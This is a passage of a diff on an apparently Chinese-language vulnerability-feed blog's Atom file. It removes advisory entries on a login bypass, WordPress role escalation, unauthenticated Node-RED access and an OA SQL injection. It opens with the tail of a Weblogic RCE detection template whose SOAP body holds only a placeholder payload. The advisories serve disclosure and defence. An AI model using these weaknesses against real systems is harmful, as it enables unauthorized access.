&lt;soapenv:Body&gt;    &lt;test&gt;Exploit Payload&lt;/test&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre>matchers-condition: and<br>matchers:<ul><li>type: status<br>status:<ul><li>500</li></ul></li><li>type: word<br>part: body<br>words:<ul><li>“weblogic.wsee.jaxws.WsLoggingInterceptor”</li></ul></li></ul></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Weblogic Remote Command Execution (RCE)</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
   </entry>
   
@@ -441,105 +545,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>An unauthenticated remote attacker can bypass the login to the web application of the affected</title>
-    <link href="http://example.com/2025/07/01/github_3431233449/"/>
-    <id>http://example.com/2025/07/01/github_3431233449/</id>
-    <published>2025-07-01T10:00:06.251Z</published>
-    <updated>2025-07-01T10:00:06.248Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-xh36-r8rr-4pmg">https://github.com/advisories/GHSA-xh36-r8rr-4pmg</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-41648">https://nvd.nist.gov/vuln/detail/CVE-2025-41648</a></p></li><li><p><a href="https://certvde.com/en/advisories/VDE-2025-039">https://certvde.com/en/advisories/VDE-2025-039</a></p></li><li><p><a href="https://github.com/advisories/GHSA-xh36-r8rr-4pmg">https://github.com/advisories/GHSA-xh36-r8rr-4pmg</a></p></li></ul><p><strong>描述：</strong></p><p>An unauthenticated remote attacker can bypass the login to the web application of the affected devices making it possible to access and change all available settings of the IndustrialPI.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-xh36-r8rr-4pmg&quot;&gt;https://github.com/advisories/GHSA-xh36-r8rr-4pmg&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>The Opal Estate Pro – Property Management and Submission plugin for WordPress, used by the</title>
-    <link href="http://example.com/2025/07/01/github_3094877435/"/>
-    <id>http://example.com/2025/07/01/github_3094877435/</id>
-    <published>2025-07-01T10:00:05.916Z</published>
-    <updated>2025-07-01T10:00:05.912Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-9w3f-cw3m-94h4">https://github.com/advisories/GHSA-9w3f-cw3m-94h4</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6934">https://nvd.nist.gov/vuln/detail/CVE-2025-6934</a></p></li><li><p><a href="https://plugins.trac.wordpress.org/browser/opal-estate-pro/trunk/inc/user/class-opalestate-user.php#L228">https://plugins.trac.wordpress.org/browser/opal-estate-pro/trunk/inc/user/class-opalestate-user.php#L228</a></p></li><li><p><a href="https://plugins.trac.wordpress.org/browser/opal-estate-pro/trunk/inc/user/class-opalestate-user.php#L235">https://plugins.trac.wordpress.org/browser/opal-estate-pro/trunk/inc/user/class-opalestate-user.php#L235</a></p></li><li><p><a href="https://themeforest.net/item/fullhouse-real-estate-responsive-wordpress-theme/16179481">https://themeforest.net/item/fullhouse-real-estate-responsive-wordpress-theme/16179481</a></p></li><li><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/id/5d7b75a4-67b4-4347-91a6-dbf98da5ceaf?source=cve">https://www.wordfence.com/threat-intel/vulnerabilities/id/5d7b75a4-67b4-4347-91a6-dbf98da5ceaf?source=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-9w3f-cw3m-94h4">https://github.com/advisories/GHSA-9w3f-cw3m-94h4</a></p></li></ul><p><strong>描述：</strong></p><p>The Opal Estate Pro – Property Management and Submission plugin for WordPress, used by the FullHouse - Real Estate Responsive WordPress Theme, is vulnerable to privilege escalation via in all versions up to, and including, 1.7.5. This is due to a lack of role restriction during registration in the ‘on_regiser_user’ function. This makes it possible for unauthenticated attackers to arbitrarily choose the role, including the Administrator role, assigned when registering.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-9w3f-cw3m-94h4&quot;&gt;https://github.com/advisories/GHSA-9w3f-cw3m-94h4&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>An unauthenticated remote attacker can run arbitrary commands on the affected devices with high</title>
-    <link href="http://example.com/2025/07/01/github_2429316211/"/>
-    <id>http://example.com/2025/07/01/github_2429316211/</id>
-    <published>2025-07-01T10:00:04.753Z</published>
-    <updated>2025-07-01T10:00:04.748Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-9j57-6x57-gpv5">https://github.com/advisories/GHSA-9j57-6x57-gpv5</a></p><p><strong>CVSS 评分：</strong> 10.0</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-41656">https://nvd.nist.gov/vuln/detail/CVE-2025-41656</a></p></li><li><p><a href="https://certvde.com/en/advisories/VDE-2025-045">https://certvde.com/en/advisories/VDE-2025-045</a></p></li><li><p><a href="https://github.com/advisories/GHSA-9j57-6x57-gpv5">https://github.com/advisories/GHSA-9j57-6x57-gpv5</a></p></li></ul><p><strong>描述：</strong></p><p>An unauthenticated remote attacker can run arbitrary commands on the affected devices with high privileges because the authentication for the Node_RED server is not configured by default.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-9j57-6x57-gpv5&quot;&gt;https://github.com/advisories/GHSA-9j57-6x57-gpv5&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>红帆OA MobileOAasmx SQL注入漏洞</title>
-    <link href="http://example.com/2025/07/01/weixin_147972676/"/>
-    <id>http://example.com/2025/07/01/weixin_147972676/</id>
-    <published>2025-07-01T09:33:34.334Z</published>
-    <updated>2025-07-01T09:33:34.331Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> Nday Poc</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/6vPmbFO4SxcZZlTm9RXPXw">https://mp.weixin.qq.com/s/6vPmbFO4SxcZZlTm9RXPXw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Nday Poc&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/6vPmbFO4SxcZZlTm9RXPXw&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
     
   </entry>
   
